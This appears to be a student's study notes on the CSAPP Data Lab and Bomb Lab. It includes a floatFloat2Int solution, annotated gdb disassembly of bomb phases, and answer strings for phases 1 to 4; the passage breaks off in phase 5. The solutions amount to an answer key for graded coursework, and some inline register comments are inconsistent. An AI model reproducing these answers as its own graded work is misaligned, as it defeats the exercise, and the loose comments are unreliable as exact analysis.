    <span class="md-ellipsis">
      Example Calculation: Address and Index for A[k][k]
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#example-calculation-address-and-index-for-bkk" class="md-nav__link">
    <span class="md-ellipsis">
      Example Calculation: Address and Index for B[k][k]
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#simplifying-the-index-calculation" class="md-nav__link">
    <span class="md-ellipsis">
      Simplifying the Index Calculation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#conclusion" class="md-nav__link">
    <span class="md-ellipsis">
      Conclusion
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cache-conflict-explanation" class="md-nav__link">
    <span class="md-ellipsis">
      Cache Conflict Explanation
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Cache Conflict Explanation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#64-x-64" class="md-nav__link">
    <span class="md-ellipsis">
      64 x 64
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


<h1 id="csapp-computer-system">CSAPP - Computer System</h1>
<h2 id="lab1-data-lab-c-bitwise-operations">Lab1 - Data Lab (C bitwise operations)</h2>
<p>How to setup the test environment.</p>
<p>How to open VS code on WSL2. -&gt; Open Docker Desktop. On Vs code, type remote container</p>
<h2 id="for-lab1-data-lab1">For lab1. Data lab1.</h2>
<p>cd ~</p>
<p>ls</p>
<p>cd csapplab</p>
<p>cd datalab/datalab-handout</p>
<p>make clean <strong>&amp;&amp;</strong> make <strong>&amp;&amp;</strong> ./btest</p>
<p>Notes:</p>
<p>Q1. BitXor;</p>
<p><img alt="XOR Gate Truth Table, Symbol, Diagram, Application, Properties" src="../CSAPP.assets/clip_image002.png" /></p>
<p>Ideas: First find the OR gate of two inputs, flip them use not then and them. And the initial two inputs and not the output then finally and the two values. </p>
<h3 id="floating-point">Floating point:</h3>
<p><img alt="image-20240429002223878" src="../CSAPP.assets/image-20240429002223878.png" /></p>
<p><img alt="image-20240429002233108" src="../CSAPP.assets/image-20240429002233108.png" /></p>
<p>Will always convert to the form of M = 1.xxx, and M x 2^pow</p>
<h4 id="floatfloat2intf">floatFloat2Int(f)</h4>
<blockquote>
<p>将浮点数转换为整数</p>
</blockquote>
<ul>
<li>代码</li>
</ul>
<pre><code class="language-c">/* 
 * floatFloat2Int - Return bit-level equivalent of expression (int) f
 *   for floating point argument f.
 *   Argument is passed as unsigned int, but
 *   it is to be interpreted as the bit-level representation of a
 *   single-precision floating point value.
 *   Anything out of range (including NaN and infinity) should return
 *   0x80000000u.
 *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while
 *   Max ops: 30
 *   Rating: 4
 */
int floatFloat2Int(unsigned uf) {
  int s_    = uf&gt;&gt;31;
  int exp_  = ((uf&amp;0x7f800000)&gt;&gt;23)-127;
  int frac_ = (uf&amp;0x007fffff)|0x00800000;
  if(!(uf&amp;0x7fffffff)) return 0;

  if(exp_ &gt; 31) return 0x80000000;
  if(exp_ &lt; 0) return 0;

  if(exp_ &gt; 23) frac_ &lt;&lt;= (exp_-23);
  else frac_ &gt;&gt;= (23-exp_);

  if(!((frac_&gt;&gt;31)^s_)) return frac_;
  else if(frac_&gt;&gt;31) return 0x80000000;
  else return ~frac_+1;
}
</code></pre>
<ul>
<li>思路</li>
</ul>
<p>首先考虑特殊情况：如果原浮点值为0则返回0；如果真实指数大于31（frac部分是大于等于1的，1&lt;&lt;31位会覆盖符号位），返回规定的溢出值<strong>0x80000000u</strong>；如果 𝑒𝑥𝑝&lt;0 （1右移x位,x&gt;0，结果为0）则返回0。剩下的情况：首先把小数部分（23位）转化为整数（和23比较），然后判断是否溢出：如果和原符号相同则直接返回，否则如果结果为负（原来为正）则溢出返回越界指定值<strong>0x80000000u</strong>，否则原来为负，结果为正，则需要返回其补码（相反数）。</p>
<p>The idea is to apply the concept that when converting from the binary int to the float format, need to use the normalized encoding idea.</p>
<h3 id="takeaway">Takeaway:</h3>
<p><img alt="image-20240429010601121" src="../CSAPP.assets/image-20240429010601121.png" /></p>
<p><img alt="image-20240429010732263" src="../CSAPP.assets/image-20240429010732263.png" /></p>
<p><img alt="image-20240429010854316" src="../CSAPP.assets/image-20240429010854316.png" /></p>
<ul>
<li>
<p>Any arithmetic operations with unsigned values will cast the result to be unsigned.</p>
</li>
<li>
<p>The size_t defined as unsinged value with length = word size, In C++, <code>size_t</code> is a data type used to represent the size of objects. It's an unsigned integer type that's capable of storing the size in bytes of any object. Its actual size can vary depending on the platform and compiler, but it's typically chosen to <strong>be large enough</strong> to represent the maximum possible size of a theoretically possible object on the given platform. size_t is better than used unsigned_int .</p>
</li>
<li>Reference https://pvs-studio.com/en/blog/terms/0044/#:~:text=The%20size_t%20is%20chosen%20so,64%2Dbit%20one%2064%20bits.</li>
<li>The <strong>2's complement</strong> of a value is <strong>~x + 1;</strong></li>
</ul>
<h2 id="lab2-bomb-labdisassemble-the-object-code-to-reverse-engineering-the-program">Lab2 - Bomb Lab(Disassemble the object code to reverse engineering the program)</h2>
<p><img alt="image-20240523224807402" src="../CSAPP.assets/image-20240523224807402.png" /></p>
<p><img alt="image-20240523224819581" src="../CSAPP.assets/image-20240523224819581.png" /></p>
<p><img alt="image-20240523225033369" src="../CSAPP.assets/image-20240523225033369.png" /></p>
<h3 id="gdb-debug-tool">GDB Debug tool</h3>
<p>To debug, use dgb debugged, the pdf can be found at this link</p>
<p>https://csapp.cs.cmu.edu/2e/docs/gdbnotes-x86-64.pdf</p>
<p>gdb object code or compiled code <code>gdb bomb</code></p>
<p>Inside, running disassmble function <code>disas &lt;function name&gt;</code></p>
<p><code>x/s 0x402400</code> x/s will be used to Examine a string stored at 0xbffff890.</p>
<p>Write a function in x64</p>
<p><img alt="image-20240524232341653" src="../CSAPP.assets/image-20240524232341653.png" /></p>
<h3 id="phase_1">Phase_1</h3>
<pre><code class="language-assembly">Dump of assembler code for function phase_1:
   0x0000000000400ee0 &lt;+0&gt;:     sub    $0x8,%rsp
   0x0000000000400ee4 &lt;+4&gt;:     mov    $0x402400,%esi
   0x0000000000400ee9 &lt;+9&gt;:     callq  0x401338 &lt;strings_not_equal&gt;
   0x0000000000400eee &lt;+14&gt;:    test   %eax,%eax
//Expected return eax to be zero to diffuse the bomb
   0x0000000000400ef0 &lt;+16&gt;:    je     0x400ef7 &lt;phase_1+23&gt;
   0x0000000000400ef2 &lt;+18&gt;:    callq  0x40143a &lt;explode_bomb&gt;
   0x0000000000400ef7 &lt;+23&gt;:    add    $0x8,%rsp
   0x0000000000400efb &lt;+27&gt;:    retq   
End of assembler dump.

Dump of assembler code for function strings_not_equal:
   0x0000000000401338 &lt;+0&gt;:     push   %r12
   0x000000000040133a &lt;+2&gt;:     push   %rbp
   0x000000000040133b &lt;+3&gt;:     push   %rbx
   0x000000000040133c &lt;+4&gt;:     mov    %rdi,%rbx
   0x000000000040133f &lt;+7&gt;:     mov    %rsi,%rbp
   0x0000000000401342 &lt;+10&gt;:    callq  0x40131b &lt;string_length&gt;


Dump of assembler code for function string_length:
   0x000000000040131b &lt;+0&gt;:     cmpb   $0x0,(%rdi)
   0x000000000040131e &lt;+3&gt;:     je     0x401332 &lt;string_length+23&gt;
   0x0000000000401320 &lt;+5&gt;:     mov    %rdi,%rdx
   0x0000000000401323 &lt;+8&gt;:     add    $0x1,%rdx

Address     Value
0x1000      'h'
0x1001      'e'
0x1002      'l'
0x1003      'l'
0x1004      'o'
0x1005      '\0' (null terminator)   

   0x0000000000401327 &lt;+12&gt;:    mov    %edx,%eax
   0x0000000000401329 &lt;+14&gt;:    sub    %edi,%eax
   0x000000000040132b &lt;+16&gt;:    cmpb   $0x0,(%rdx)
   0x000000000040132e &lt;+19&gt;:    jne    0x401323 &lt;string_length+8&gt;
   0x0000000000401330 &lt;+21&gt;:    repz retq 
   0x0000000000401332 &lt;+23&gt;:    mov    $0x0,%eax
   0x0000000000401337 &lt;+28&gt;:    retq   
End of assembler dump.


</code></pre>
<p>Explain of String_lengh:</p>
<p><code>Dump of assembler code for function string_length:
   0x000000000040131b &lt;+0&gt;:     cmpb   $0x0,(%rdi)
   0x000000000040131e &lt;+3&gt;:     je     0x401332 &lt;string_length+23&gt;
   0x0000000000401320 &lt;+5&gt;:     mov    %rdi,%rdx
   0x0000000000401323 &lt;+8&gt;:     add    $0x1,%rdx
   0x0000000000401327 &lt;+12&gt;:    mov    %edx,%eax
   0x0000000000401329 &lt;+14&gt;:    sub    %edi,%eax
   0x000000000040132b &lt;+16&gt;:    cmpb   $0x0,(%rdx)
   0x000000000040132e &lt;+19&gt;:    jne    0x401323 &lt;string_length+8&gt;
   0x0000000000401330 &lt;+21&gt;:    repz retq 
   0x0000000000401332 &lt;+23&gt;:    mov    $0x0,%eax
   0x0000000000401337 &lt;+28&gt;:    retq   
End of assembler dump.</code></p>
<p>First, compare the first dereference value at rdi, if not zero, go to the next statement, if zero. return 0.</p>
<p>Copy the input string rdi to the rdx,</p>
<p>Move the pointer one step at rdx,</p>
<p>Copy the edx to eax</p>
<p>Subtract eax from the original edi, it will perform the address subtracting. First loop should return 1 step,</p>
<p>Compare the next pointer address value if it is null with zero. If not, go back to the +8, if yes, it will return the eax reg.</p>
<p>This function is used to calcualte the string length.</p>
<p><img alt="image-20240525021728086" src="../CSAPP.assets/image-20240525021728086.png" /></p>
<p>In the main code section, the rdi is a  user input,</p>
<p>rsi is the direct access of the memory address at 0x402400.</p>
<pre><code class="language-assembly">Dump of assembler code for function strings_not_equal:
////what does it do, just compare tow input string, rdi and rsi, return the eax to zero if they are equal else return eax to 1

   0x0000000000401338 &lt;+0&gt;:     push   %r12
   0x000000000040133a &lt;+2&gt;:     push   %rbp
   0x000000000040133b &lt;+3&gt;:     push   %rbx
   0x000000000040133c &lt;+4&gt;:     mov    %rdi,%rbx
   0x000000000040133f &lt;+7&gt;:     mov    %rsi,%rbp
   0x0000000000401342 &lt;+10&gt;:    callq  0x40131b &lt;string_length&gt;
   0x0000000000401347 &lt;+15&gt;:    mov    %eax,%r12d
   0x000000000040134a &lt;+18&gt;:    mov    %rbp,%rdi
   0x000000000040134d &lt;+21&gt;:    callq  0x40131b &lt;string_length&gt;
   0x0000000000401352 &lt;+26&gt;:    mov    $0x1,%edx    
   0x0000000000401357 &lt;+31&gt;:    cmp    %eax,%r12d   //compare the length of two inputs
   0x000000000040135a &lt;+34&gt;:    jne    0x40139b &lt;strings_not_equal+99&gt;  //if not same, end, set eax = edx = 0x1
   0x000000000040135c &lt;+36&gt;:    movzbl (%rbx),%eax
   //what is movzbl, movz, convert the single byte into 4bytes, 8bit -32bit. and zero extend the eax register

Zero-Extension
Zero-Extend: This means that the rest of the EAX register (the upper 24 bits) will be set to zero after the byte is moved.
Example: If the byte at (%rbx) is 0x41 (which is the ASCII code for 'A'):
After execution, EAX will be 0x00000041.

   0x000000000040135f &lt;+39&gt;:    test   %al,%al
   //zf set wen a&amp;b == 0, test the rax if the start is null, check the char if it is null, if null then both empty, still same return eax =0
   0x0000000000401361 &lt;+41&gt;:    je     0x401388 &lt;strings_not_equal+80&gt;
   0x0000000000401363 &lt;+43&gt;:    cmp    0x0(%rbp),%al
   0x0000000000401366 &lt;+46&gt;:    je     0x401372 &lt;strings_not_equal+58&gt;
   0x0000000000401368 &lt;+48&gt;:    jmp    0x40138f &lt;strings_not_equal+87&gt;
   0x000000000040136a &lt;+50&gt;:    cmp    0x0(%rbp),%al
   0x000000000040136d &lt;+53&gt;:    nopl   (%rax)
   0x0000000000401370 &lt;+56&gt;:    jne    0x401396 &lt;strings_not_equal+94&gt;
   0x0000000000401372 &lt;+58&gt;:    add    $0x1,%rbx
   0x0000000000401376 &lt;+62&gt;:    add    $0x1,%rbp
   0x000000000040137a &lt;+66&gt;:    movzbl (%rbx),%eax
   0x000000000040137d &lt;+69&gt;:    test   %al,%al

   0x000000000040137f &lt;+71&gt;:    jne    0x40136a &lt;strings_not_equal+50&gt;
   0x0000000000401381 &lt;+73&gt;:    mov    $0x0,%edx
   0x0000000000401386 &lt;+78&gt;:    jmp    0x40139b &lt;strings_not_equal+99&gt;
   0x0000000000401388 &lt;+80&gt;:    mov    $0x0,%edx
   0x000000000040138d &lt;+85&gt;:    jmp    0x40139b &lt;strings_not_equal+99&gt;
   0x000000000040138f &lt;+87&gt;:    mov    $0x1,%edx
   0x0000000000401394 &lt;+92&gt;:    jmp    0x40139b &lt;strings_not_equal+99&gt;
   0x0000000000401396 &lt;+94&gt;:    mov    $0x1,%edx
   0x000000000040139b &lt;+99&gt;:    mov    %edx,%eax
   0x000000000040139d &lt;+101&gt;:   pop    %rbx
   0x000000000040139e &lt;+102&gt;:   pop    %rbp
   0x000000000040139f &lt;+103&gt;:   pop    %r12
   0x00000000004013a1 &lt;+105&gt;:   retq   
End of assembler dump.
</code></pre>
<p><img alt="image-20240525141225889" src="../CSAPP.assets/image-20240525141225889.png" /></p>
<h4 id="ans">Ans:</h4>
<p>(gdb) x/s 0x402400</p>
<p>0x402400:       "Border relations with Canada have never been better."</p>
<p>Border relations with Canada have never been better.</p>
<h3 id="phase_2">Phase_2</h3>
<p>The <code>LEA</code> (Load Effective Address) instruction in x86-64 assembly language is used to perform address calculations and load the result into a register. Unlike other instructions that directly access memory, <code>LEA</code> simply computes an address and stores it in a register without accessing the memory at that address.</p>
<p>The purpose of <code>LEA</code> is to allow one to perform a non-trivial address calculation and store the result [for later usage]</p>
<p>Lea 用来计算地址，值不会进行传递</p>
<pre><code>assembly
Copy code
LEA destination, source
</code></pre>
<ul>
<li><strong>destination</strong>: A general-purpose register where the result of the address calculation will be stored.</li>
<li><strong>source</strong>: An effective address expression that typically involves base registers, index registers, scaling factors, and displacement values.</li>
</ul>
<pre><code class="language-assembly">Dump of assembler code for function phase_2:
   0x0000000000400efc &lt;+0&gt;:     push   %rbp
   0x0000000000400efd &lt;+1&gt;:     push   %rbx
   0x0000000000400efe &lt;+2&gt;:     sub    $0x28,%rsp
   //allocate 40bytes to store local variables on stack
   0x0000000000400f02 &lt;+6&gt;:     mov    %rsp,%rsi

   // rsi = rsp,
   0x0000000000400f05 &lt;+9&gt;:     callq  0x40145c &lt;read_six_numbers&gt;
   {
   rsi -&gt; rdx
   0x4 (rsi) -&gt; rcx

   6 overall registers and stack pointer as arguments to read and store the data in rsi = rsp(in phase_2),

   rsi -&gt; rdx first integer -&gt; rax
0x4(%rsp) =  0x4(%rsi) -&gt; rcx: Address for the second integer. -&gt; 0x4(rax)
0x14(%rsi) -&gt; rax: Address for the sixth integer. -&gt; + 4
0x10(%rsi) -&gt; rax: Address for the fifth integer. -&gt; +4
0xc(%rsi) -&gt; r9: Address for the fourth integer.    -&gt; +4

the scannf function will get the inputs from rdi, the format of rsi, and store the reading values at register rdx -&gt; stack, which is on rsp. and return rax, how many values read
   }


   0x0000000000400f0a &lt;+14&gt;:    cmpl   $0x1,(%rsp)
   // rsp 0x0 = 1

   0x0000000000400f0e &lt;+18&gt;:    je     0x400f30 &lt;phase_2+52&gt;
   0x0000000000400f10 &lt;+20&gt;:    callq  0x40143a &lt;explode_bomb&gt;
   0x0000000000400f15 &lt;+25&gt;:    jmp    0x400f30 &lt;phase_2+52&gt;
   0x0000000000400f17 &lt;+27&gt;:    mov    -0x4(%rbx),%eax
   0x0000000000400f1a &lt;+30&gt;:    add    %eax,%eax
   // adding the current one by itself -&gt; 1+1 = 2
   0x0000000000400f1c &lt;+32&gt;:    cmp    %eax,(%rbx)
   // the second int(0x4 rsp) = 2, do the same until it reaches 
   0x0000000000400f1e &lt;+34&gt;:    je     0x400f25 &lt;phase_2+41&gt;
   0x0000000000400f20 &lt;+36&gt;:    callq  0x40143a &lt;explode_bomb&gt;
   0x0000000000400f25 &lt;+41&gt;:    add    $0x4,%rbx
   //
   0x0000000000400f29 &lt;+45&gt;:    cmp    %rbp,%rbx
   // stop when the rbp is at 0x18 = 24bytes
   0x0000000000400f2c &lt;+48&gt;:    jne    0x400f17 &lt;phase_2+27&gt;
   0x0000000000400f2e &lt;+50&gt;:    jmp    0x400f3c &lt;phase_2+64&gt;
   0x0000000000400f30 &lt;+52&gt;:    lea    0x4(%rsp),%rbx
   0x0000000000400f35 &lt;+57&gt;:    lea    0x18(%rsp),%rbp
   //0x18 = 24, last digit in rbp
   0x0000000000400f3a &lt;+62&gt;:    jmp    0x400f17 &lt;phase_2+27&gt;
   0x0000000000400f3c &lt;+64&gt;:    add    $0x28,%rsp
   0x0000000000400f40 &lt;+68&gt;:    pop    %rbx
   0x0000000000400f41 &lt;+69&gt;:    pop    %rbp
   0x0000000000400f42 &lt;+70&gt;:    retq   

</code></pre>
<p><code>rdi is the input</code></p>
<pre><code class="language-assembly">Dump of assembler code for function read_six_numbers:
   0x000000000040145c &lt;+0&gt;:     sub    $0x18,%rsp
   // assign 24 bytes to the rsp
   0x0000000000401460 &lt;+4&gt;:     mov    %rsi,%rdx
   0x0000000000401463 &lt;+7&gt;:     lea    0x4(%rsi),%rcx
   0x0000000000401467 &lt;+11&gt;:    lea    0x14(%rsi),%rax
   0x000000000040146b &lt;+15&gt;:    mov    %rax,0x8(%rsp)
   0x0000000000401470 &lt;+20&gt;:    lea    0x10(%rsi),%rax
   0x0000000000401474 &lt;+24&gt;:    mov    %rax,(%rsp)
   0x0000000000401478 &lt;+28&gt;:    lea    0xc(%rsi),%r9
   0x000000000040147c &lt;+32&gt;:    lea    0x8(%rsi),%r8
   0x0000000000401480 &lt;+36&gt;:    mov    $0x4025c3,%esi
   0x0000000000401485 &lt;+41&gt;:    mov    $0x0,%eax
   0x000000000040148a &lt;+46&gt;:    callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;
   0x000000000040148f &lt;+51&gt;:    cmp    $0x5,%eax
   0x0000000000401492 &lt;+54&gt;:    jg     0x401499 &lt;read_six_numbers+61&gt;
   0x0000000000401494 &lt;+56&gt;:    callq  0x40143a &lt;explode_bomb&gt;
   0x0000000000401499 &lt;+61&gt;:    add    $0x18,%rsp
   0x000000000040149d &lt;+65&gt;:    retq   
End of assembler dump.
</code></pre>
<p>What this function does is to just read six numbers, and store them into each register </p>
<p><img alt="image-20240530002636750" src="../CSAPP.assets/image-20240530002636750.png" /></p>
<h4 id="ans_1">Ans:</h4>
<p>1 2 4 8 16 32</p>
<h3 id="phase_3">Phase_3</h3>
<pre><code class="language-assembly">Dump of assembler code for function phase_3:
   0x0000000000400f43 &lt;+0&gt;:     sub    $0x18,%rsp
   0x0000000000400f47 &lt;+4&gt;:     lea    0xc(%rsp),%rcx
   0x0000000000400f4c &lt;+9&gt;:     lea    0x8(%rsp),%rdx
   0x0000000000400f51 &lt;+14&gt;:    mov    $0x4025cf,%esi
   0x0000000000400f56 &lt;+19&gt;:    mov    $0x0,%eax
   0x0000000000400f5b &lt;+24&gt;:    callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;
   0x0000000000400f60 &lt;+29&gt;:    cmp    $0x1,%eax
   0x0000000000400f63 &lt;+32&gt;:    jg     0x400f6a &lt;phase_3+39&gt;
   0x0000000000400f65 &lt;+34&gt;:    callq  0x40143a &lt;explode_bomb&gt;
   0x0000000000400f6a &lt;+39&gt;:    cmpl   $0x7,0x8(%rsp)
   0x0000000000400f6f &lt;+44&gt;:    ja     0x400fad &lt;phase_3+106&gt;
   //compare the rsp with 0x7, if above will just explode the bomb
   0x0000000000400f71 &lt;+46&gt;:    mov    0x8(%rsp),%eax
   0x0000000000400f75 &lt;+50&gt;:    jmpq   *0x402470(,%rax,8)

   // jump table
   (gdb) x/8gx 0x402470
0x402470:       0x0000000000400f7c      0x0000000000400fb9
0x402480:       0x0000000000400f83      0x0000000000400f8a
0x402490:       0x0000000000400f91      0x0000000000400f98
0x4024a0:       0x0000000000400f9f      0x0000000000400fa6
, so if the first int is 0, jump to 0x0000000000400f7c, store 0xcf and compare with 2nd int. 0xcf = (CF)₁₆ = (12 × 16¹) + (15 × 16⁰) = 207
   0x0000000000400f7c &lt;+57&gt;:    mov    $0xcf,%eax
   0x0000000000400f81 &lt;+62&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;
   0x0000000000400f83 &lt;+64&gt;:    mov    $0x2c3,%eax
   0x0000000000400f88 &lt;+69&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;
   0x0000000000400f8a &lt;+71&gt;:    mov    $0x100,%eax
   0x0000000000400f8f &lt;+76&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;
   0x0000000000400f91 &lt;+78&gt;:    mov    $0x185,%eax
   0x0000000000400f96 &lt;+83&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;
   0x0000000000400f98 &lt;+85&gt;:    mov    $0xce,%eax
   0x0000000000400f9d &lt;+90&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;
   0x0000000000400f9f &lt;+92&gt;:    mov    $0x2aa,%eax
   0x0000000000400fa4 &lt;+97&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;
   0x0000000000400fa6 &lt;+99&gt;:    mov    $0x147,%eax
   0x0000000000400fab &lt;+104&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;
   0x0000000000400fad &lt;+106&gt;:   callq  0x40143a &lt;explode_bomb&gt;
   0x0000000000400fb2 &lt;+111&gt;:   mov    $0x0,%eax
   0x0000000000400fb7 &lt;+116&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;
   0x0000000000400fb9 &lt;+118&gt;:   mov    $0x137,%eax
   0x0000000000400fbe &lt;+123&gt;:   cmp    0xc(%rsp),%eax
   0x0000000000400fc2 &lt;+127&gt;:   je     0x400fc9 &lt;phase_3+134&gt;
   0x0000000000400fc4 &lt;+129&gt;:   callq  0x40143a &lt;explode_bomb&gt;
   0x0000000000400fc9 &lt;+134&gt;:   add    $0x18,%rsp
   0x0000000000400fcd &lt;+138&gt;:   retq   
End of assembler dump.
</code></pre>
<h4 id="jump-table">Jump Table</h4>
<p><img alt="" src="../CSAPP.assets/image-20240531170237069.png" /></p>
<p><img alt="image-20240531170245463" src="../CSAPP.assets/image-20240531170245463.png" /></p>
<h4 id="ans_2">Ans:</h4>
<p>0 207</p>
<h3 id="phase_4">Phase_4</h3>
<pre><code class="language-assembly">Dump of assembler code for function phase_4:
   0x000000000040100c &lt;+0&gt;:     sub    $0x18,%rsp
   0x0000000000401010 &lt;+4&gt;:     lea    0xc(%rsp),%rcx   ;2nd = 0xc(%rsp)
   0x0000000000401015 &lt;+9&gt;:     lea    0x8(%rsp),%rdx   ;1st= 0x8(%rsp)
   0x000000000040101a &lt;+14&gt;:    mov    $0x4025cf,%esi   ;0x4025cf:       &quot;%d %d&quot;
   0x000000000040101f &lt;+19&gt;:    mov    $0x0,%eax        
   0x0000000000401024 &lt;+24&gt;:    callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;
   0x0000000000401029 &lt;+29&gt;:    cmp    $0x2,%eax    expect 2ints
   0x000000000040102c &lt;+32&gt;:    jne    0x401035 &lt;phase_4+41&gt;
   0x000000000040102e &lt;+34&gt;:    cmpl   $0xe,0x8(%rsp)       ;0x8(%rsp)= 1st &lt;= 14
   0x0000000000401033 &lt;+39&gt;:    jbe    0x40103a &lt;phase_4+46&gt;    ;jump if below 
   0x0000000000401035 &lt;+41&gt;:    callq  0x40143a &lt;explode_bomb&gt;
   0x000000000040103a &lt;+46&gt;:    mov    $0xe,%edx        ;edx = 14
   0x000000000040103f &lt;+51&gt;:    mov    $0x0,%esi        ;esi = 0
   0x0000000000401044 &lt;+56&gt;:    mov    0x8(%rsp),%edi   ;edi = 1st &lt;= 14
   0x0000000000401048 &lt;+60&gt;:    callq  0x400fce &lt;func4&gt; 
   0x000000000040104d &lt;+65&gt;:    test   %eax,%eax        ; expeact eax to be 0, one case if edi =6
   0x000000000040104f &lt;+67&gt;:    jne    0x401058 &lt;phase_4+76&gt;    //jump not !eq/!zero
   0x0000000000401051 &lt;+69&gt;:    cmpl   $0x0,0xc(%rsp)       ; cmp 0 2nd
   0x0000000000401056 &lt;+74&gt;:    je     0x40105d &lt;phase_4+81&gt;    ;solve if euqal, so 2nd =0
   0x0000000000401058 &lt;+76&gt;:    callq  0x40143a &lt;explode_bomb&gt;
   0x000000000040105d &lt;+81&gt;:    add    $0x18,%rsp
   0x0000000000401061 &lt;+85&gt;:    retq   
End of assembler dump.

Dump of assembler code for function func4: (edi = x, esi =0, edx = 14)
   0x0000000000400fce &lt;+0&gt;:     sub    $0x8,%rsp
   0x0000000000400fd2 &lt;+4&gt;:     mov    %edx,%eax ;eax = 14
   0x0000000000400fd4 &lt;+6&gt;:     sub    %esi,%eax ;eax = 14 - 0
   0x0000000000400fd6 &lt;+8&gt;:     mov    %eax,%ecx ;ecx = 14
   0x0000000000400fd8 &lt;+10&gt;:    shr    $0x1f,%ecx ; ecx = 0
   //shr -&gt; logical shift by index ecx

   0x0000000000400fdb &lt;+13&gt;:    add    %ecx,%eax  ;eax = 0 + 14
   0x0000000000400fdd &lt;+15&gt;:    sar    %eax ; eax = 1110 &gt;&gt; 1 = 111 = 7
   //sar Shift Arithmetic Right. 
   // arithmetic shift will maintain the sign bit 
   0x0000000000400fdf &lt;+17&gt;:    lea    (%rax,%rsi,1),%ecx   ecx = 6
   // addressing mode. ecx = rax + rsi * 1 = 6 +0 * 1= 6
   0x0000000000400fe2 &lt;+20&gt;:    cmp    %edi,%ecx    cmp x, 6
   0x0000000000400fe4 &lt;+22&gt;:    jle    0x400ff2 &lt;func4+36&gt;  ;jump if less or equal
   0x0000000000400fe6 &lt;+24&gt;:    lea    -0x1(%rcx),%edx
   0x0000000000400fe9 &lt;+27&gt;:    callq  0x400fce &lt;func4&gt;
   0x0000000000400fee &lt;+32&gt;:    add    %eax,%eax
   0x0000000000400ff0 &lt;+34&gt;:    jmp    0x401007 &lt;func4+57&gt;
   0x0000000000400ff2 &lt;+36&gt;:    mov    $0x0,%eax    ;eax =0
   0x0000000000400ff7 &lt;+41&gt;:    cmp    %edi,%ecx    ;cmp x, 7    first do lower than greater compare
   0x0000000000400ff9 &lt;+43&gt;:    jge    0x401007 &lt;func4+57&gt;  // jump if greater or equal ; 6 in this case could pass, edi =6
   0x0000000000400ffb &lt;+45&gt;:    lea    0x1(%rcx),%esi
   0x0000000000400ffe &lt;+48&gt;:    callq  0x400fce &lt;func4&gt;
   0x0000000000401003 &lt;+53&gt;:    lea    0x1(%rax,%rax,1),%eax
   0x0000000000401007 &lt;+57&gt;:    add    $0x8,%rsp
   0x000000000040100b &lt;+61&gt;:    retq   
End of assembler dump.
</code></pre>
<h4 id="ans_3">Ans:</h4>
<p>7 0</p>
<h3 id="phase_5">Phase_5</h3>
<pre><code class="language-assembly">(gdb) disas phase_5
Dump of assembler code for function phase_5: (rdi is the input string)
   0x0000000000401062 &lt;+0&gt;:     push   %rbx     ;save rbx reg   
   0x0000000000401063 &lt;+1&gt;:     sub    $0x20,%rsp   ;allocate 32
   0x0000000000401067 &lt;+5&gt;:     mov    %rdi,%rbx    ;rbx = rdi (input)
   0x000000000040106a &lt;+8&gt;:     mov    %fs:0x28,%rax    ;canary setup, 
   0x0000000000401073 &lt;+17&gt;:    mov    %rax,0x18(%rsp)  ;24 rsp = rax
   0x0000000000401078 &lt;+22&gt;:    xor    %eax,%eax    ;erase canary
   0x000000000040107a &lt;+24&gt;:    callq  0x40131b &lt;string_length&gt; ;from phase_1, calcualte string length
   0x000000000040107f &lt;+29&gt;:    cmp    $0x6,%eax    ;expect 6 strings separate with space
   0x0000000000401082 &lt;+32&gt;:    je     0x4010d2 &lt;phase_5+112&gt;   ;go to 112
   0x0000000000401084 &lt;+34&gt;:    callq  0x40143a &lt;explode_bomb&gt;
   0x0000000000401089 &lt;+39&gt;:    jmp    0x4010d2 &lt;phase_5+112&gt;
   ; loop from the +74, rbx is the input, for(rax=0; rax&lt;=6;rax++)
   0x000000000040108b &lt;+41&gt;:    movzbl (%rbx,%rax,1),%ecx   ;ecx = rbx + rax * 1 = rbx = input, rbx is the index of the 6 chars, so each time the rax will increase by 1, and rbx pointer will increment by 1
   0x000000000040108f &lt;+45&gt;:    mov    %cl,(%rsp)           ;rsp = 8bit rcx, first char of input into rsp
   0x0000000000401092 &lt;+48&gt;:    mov    (%rsp),%rdx          ;rdx = rsp = first char
   0x0000000000401096 &lt;+52&gt;:    and    $0xf,%edx            ;edx = 0xf = 0b1111 &amp; first char, expect first to be 9, first can be i or y, second can be o or O
;http://sticksandstones.kstrom.com/appen.html, use this link to find docs
    ;3rd -&gt; n,N
   ;4rd -&gt; e, E, u, U
   ;5th -&gt; v,F,V
   ;6th -&gt; g,G,w,W
   0x0000000000401099 &lt;+55&gt;:    movzbl 0x4024b0(%rdx),%edx  ;edx = 0x4024b0 + (rdx)
;   (gdb) x/s 0x4024b0
;0x4024b0 &lt;array.3449&gt;:  &quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;
; based on the index of bl, move the first char into edx, use this string to decrept the msg
;rdx = 9. edx = f
;rdx = 15. edx = l
;rdx = 14. edx = y
;rdx = 5, edx = e
;rdx = 6, edx = r
;rdx = 7. edx = s
   0x00000000004010a0 &lt;+62&gt;:    mov    %dl,0x10(%rsp,%rax,1)    ;rdx(8bit), 0x10 + rsp + rax*1 = 0x10 + rsp
   0x00000000004010a4 &lt;+66&gt;:    add    $0x1,%rax    ;rax = 1
   0x00000000004010a8 &lt;+70&gt;:    cmp    $0x6,%rax    ;cmp rax,6
